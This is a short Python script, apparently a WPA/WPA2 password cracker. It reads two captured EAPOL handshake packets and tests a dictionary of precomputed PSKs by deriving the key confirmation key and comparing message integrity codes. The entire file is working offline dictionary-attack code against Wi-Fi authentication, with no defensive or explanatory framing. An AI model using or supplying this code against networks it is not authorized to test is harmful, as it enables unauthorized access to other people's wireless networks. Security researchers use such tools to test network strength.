#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
crack out the password given two packets and a lib
packet format:
    key1 and key2: [0:6] are destination mac
                    [6:12] are source mac
                    [31:31+32] are anonce and snonce
    key2: [95:95+16] are MIC
    key2:[14:-1] are 802.1x frame
"""
import hmac

def H_SHA_1(K,A,B,X):    
    return hmac.new(K,A+bytes([0])+B+X,'sha1').digest() 

def PRF_128(K,A,B):
    R=H_SHA_1(K,A,B,bytes([0]))
    return R[:16]
def my_print(name,da):
    print(name,"".join('%02x'%i for i in da))
def crack_pass2(psk_lib,key1,key2):
    #key1 and key2 are EAPOL packets 1 and 2. of size 113 and 135 respectively
    if len(key1)!=113 or len(key2)!=135:
        return None
    mac1=key2[:6]   
    mac2=key2[6:12]
    anonce=key1[31:31+32]
    snonce=key2[31:31+32]
    mic=key2[95:95+16]
    data=key2[14:95]+bytes([0])*16+key2[95+16:]
    for psw,psk in psk_lib.items():
        kck=PRF_128(psk,b'Pairwise key expansion',min(mac1,mac2)+max(mac1,mac2)+min(anonce,snonce)+max(anonce,snonce))
        t=hmac.new(kck,data,'sha1').digest()
        cmic=t[:16]       
        if mic==cmic:
            return psw        
    return None
        

